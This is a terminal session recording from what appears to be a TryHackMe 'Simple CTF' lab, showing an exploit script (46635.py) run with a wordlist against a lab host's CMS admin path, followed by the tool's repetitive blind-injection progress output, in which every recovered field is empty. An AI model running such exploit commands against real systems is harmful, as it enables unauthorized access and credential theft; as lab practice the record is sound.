@@ -1,0 +1,1219 @@
+Script started on 2020-11-20 11:17:55-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exitpython 46635.py -u http://10.10.168.186/simple/admin/ --crack -w /usr/share/wordlists/rockyou.txt[K --crack -w /usr/share/wordlists/rockyou.txt[K
+[?2004l/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
+c
+[1m[32m[0m
+[1m[31m[*] Try: 1[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 2[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 3[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 4[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 5[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 6[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 7[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 8[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 9[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: 0[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: q[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: w[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: e[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: r[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: t[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: y[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: u[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: i[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: o[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: p[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: a[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: s[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: d[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: f[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: g[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: h[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: j[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: k[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: l[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: z[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: x[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: c[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: v[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: b[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: n[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: m[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: Q[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: W[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: E[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: R[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: T[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: Y[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: U[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: I[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: O[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: P[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: A[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: S[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: D[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: F[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: G[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: H[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: J[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: K[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: L[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: Z[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: X[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: C[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: V[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: B[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: N[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: M[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: @[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: .[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: _[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: -[0m
+c
+[1m[32m[0m
+[1m[31m[*] Try: $[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 1[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 2[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 3[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 4[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 5[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 6[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 7[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 8[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 9[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: 0[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: q[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: w[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: e[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: r[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: t[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: y[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: u[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: i[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: o[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: p[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: a[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: s[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: d[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: f[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: g[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: h[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: j[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: k[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: l[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: z[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: x[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: c[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: v[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: b[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: n[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: m[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: Q[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: W[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: E[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: R[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: T[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: Y[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: U[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: I[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: O[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: P[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: A[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: S[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: D[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: F[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: G[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: H[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: J[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: K[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: L[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: Z[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: X[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: C[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: V[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: B[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: N[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: M[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: @[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: .[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: _[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: -[0m
+c
+[1m[32m
+[+] Salt for password found: [0m
+[1m[31m[*] Try: $[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 1[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 2[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 3[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 4[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 5[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 6[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 7[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 8[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 9[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: 0[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: q[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: w[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: e[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: r[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: t[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: y[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: u[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: i[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: o[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: p[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: a[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: s[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: d[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: f[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: g[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: h[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: j[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: k[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: l[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: z[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: x[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: c[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: v[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: b[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: n[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: m[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: Q[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: W[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: E[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: R[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: T[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: Y[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: U[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: I[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: O[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: P[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: A[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: S[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: D[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: F[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: G[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: H[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: J[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: K[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: L[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: Z[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: X[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: C[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: V[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: B[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: N[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: M[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: @[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: .[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: _[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: -[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: [0m
+[1m[31m[*] Try: $[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 1[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 2[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 3[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 4[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 5[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 6[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 7[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 8[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 9[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: 0[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: q[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: w[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: e[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: r[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: t[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: y[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: u[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: i[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: o[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: p[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: a[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: s[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: d[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: f[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: g[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: h[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: j[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: k[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: l[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: z[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: x[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: c[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: v[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: b[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: n[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: m[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: Q[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: W[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: E[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: R[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: T[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: Y[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: U[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: I[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: O[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: P[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: A[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: S[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: D[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: F[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: G[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: H[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: J[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: K[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: L[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: Z[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: X[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: C[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: V[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: B[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: N[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: M[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: @[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: .[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: _[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: -[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: [0m
+[1m[31m[*] Try: $[0m
+c
+[1m[32m
+[+] Salt for password found: 
+[+] Username found: 
+[+] Email found: 
+[+] Password found: [0m
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exit
+[?2004lexit
+
+Script done on 2020-11-20 11:36:10-03:00 [COMMAND_EXIT_CODE="0"]
